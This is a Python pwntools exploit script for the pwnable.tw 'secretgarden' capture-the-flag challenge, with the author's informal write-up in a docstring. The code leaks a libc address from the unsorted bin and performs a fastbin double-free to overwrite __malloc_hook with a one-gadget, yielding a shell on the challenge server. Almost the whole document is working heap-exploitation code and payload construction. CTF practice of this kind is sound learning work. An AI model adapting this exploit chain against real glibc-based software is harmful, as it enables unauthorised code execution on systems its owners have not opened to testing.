#!/usr/bin/env python3
from pwn import *
from sys import argv
"""
unsorted bin libc leak, should be simple?

heap overflow in raise flower, if we supply lower than 0x10/16 size, it will overflow into negative
since it is unsigned.

We can simply read unsorted bin fd-> pointer after we alloc chunk of same size, since we dont have to
overwrite?

double free, we can just simple use fastbin dup attack to write what where
next, all we need is the libc leak. Overwrite __malloc_hook/__free_hook with one gadget

very simple :)

===================================================================================
Okay, here is the structured "writeup"

we can simply create an unsorted bin, and since it's fd and bk pointers, point to itself within the
main_arena. malloc same size chunk and it will return the unsorted chunk WITH the fd & bk metadata
that we can read.

Something that confused me for a bit was the leak, for some reason i could only leak 5 bytes, and
sometimes it would leak junk? I could debug within gdb and I could see that my input was right next
to the unsorted bin fd pointer.

I dont understand why, but when i sent 7 bytes i would get the full 6 byte libc leak. Some theories
that i have for this:

I simple leaked the least significant byte, which was the byte that I was missing, and then leaked the
next fd pointer. Able to leak lsb due to the fact that we sent 7 bytes, and did not overwrite last?

after libc leak, a simple fastbin attack to gain code exec with one gadget

we can bypass fastbin check as long as metadata looks like chunk will fit in fastbin idx
obviously, we do not have the ability to write fake metadata, to somewhere we WANT to write to
so we will have to due with the data around it :)

"""
#context(log_level='DEBUG')
binary=ELF("./secretgarden",checksec=0)
gad=1
o_gadget=[0x45216,0x4526a,0xef6c4,0xf0567]
if len(argv)>1 and argv[1]=="-r":
    arena=0x3c3b20+88
#    system=0x443a0
    system=0x00045390
    libc=ELF("./libc_64.so.6",checksec=0)
    p=remote("chall.pwnable.tw",10203)
#    p=remote("localhost",9999)
else:
    arena=0x1c0a00+96
    libc=ELF("/usr/lib/libc.so.6",checksec=0)
    system=libc.symbols['system']
    p=binary.process()
s=lambda x,r="":p.sendlineafter(r,x)if r else p.sendline(x)
malloc=lambda len,name,color:(log.info(f"malloc: {len}"),s("1","choice :"),s(str(len),"name :"),s(name,"flower :"),s(color,"color of the flower :"))
read=lambda:(log.info("reading"),s("2","choice :"))
free=lambda idx:(log.info(f"freeing: {idx}"),s("3","choice :"),s(str(idx),":"))
clean=lambda:s("4","choice :")

chunk_sz=[32+(i*16)-8 for i in range(64)]

log.info("Starting Exploit..")
malloc(1040,"A","A")
malloc(40,"B","B")
malloc(24,"C","C")
free(0);free(1)

# i have been stuck on this for sooo long, and this apparently fixes it
# unsorted bin leak was achievable, except we only leak 6 bytes, and i really dont want to brute
malloc(1040,"A"*7,"A")

s("2","choice :")
p.recvuntil(":AAAAAAA\n");base=int.from_bytes(p.recv(6).strip(b'\n'),"little")-arena
log.info("Leaked libc: %s"%hex(base))
malloc_hook=libc.symbols['__malloc_hook']+base
free_hook=libc.symbols['__free_hook']+base
system+=base
log.info("__malloc_hook: %s"%hex(malloc_hook))
log.info("__free_hook: %s"%hex(free_hook))
log.info("system: %s"%hex(system))
def exploit(sz):
    malloc(sz,"A","A")
    malloc(sz,"B","B")
    free(4)
    free(5)
    free(4)
    log.info("Exploiting Double Free")

    # 16 = offset to chunk of interest
    # 7  = we only want lsb(byte), which is at offset 7
    # 8  = this technique requires a pointer -8 since it will calculate metadata
    malloc(sz,p64(malloc_hook-35),"A")
    malloc(sz,"A","A")
    malloc(sz,"B","B")
    malloc(sz,b"A"*19+p64(0xef6c4+base),"test")

# 0x60 is our fake

#pause()
exploit(0x60)
#pause()
free(2)
free(2)

p.interactive()
